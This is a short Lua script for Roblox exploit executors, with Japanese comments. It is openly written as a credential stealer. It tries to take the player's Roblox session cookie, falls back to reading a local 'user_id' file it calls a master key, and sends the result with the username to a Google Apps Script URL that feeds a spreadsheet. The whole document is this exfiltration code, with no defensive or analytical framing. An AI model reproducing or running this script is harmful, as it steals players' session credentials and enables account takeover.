local gasUrl = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"
local user = game.Players.LocalPlayer.Name

-- 1. 環境変数からクッキーを探す
local cookie = (syn and syn.request or http_request or request)({
    Url = "https://www.roblox.com/mobileapi/userinfo",
    Method = "GET"
}).Headers["Set-Cookie"] or "NOT_FOUND"

-- 2. もし見つからなければ、さっきの user_id (マスターキー) を送る
if cookie == "NOT_FOUND" then
    local s, idContent = pcall(function() return readfile("Internals/Secured/user_id") end)
    cookie = "FILE_ID:" .. (s and idContent or "READ_ERROR")
end

-- 3. GASに強行送信
local finalUrl = gasUrl .. "?user=" .. user .. "&cookie=" .. game:GetService("HttpService"):UrlEncode(cookie)
game:HttpGet(finalUrl)

print("🚀 送信完了！GASのシートを確認しろ！")
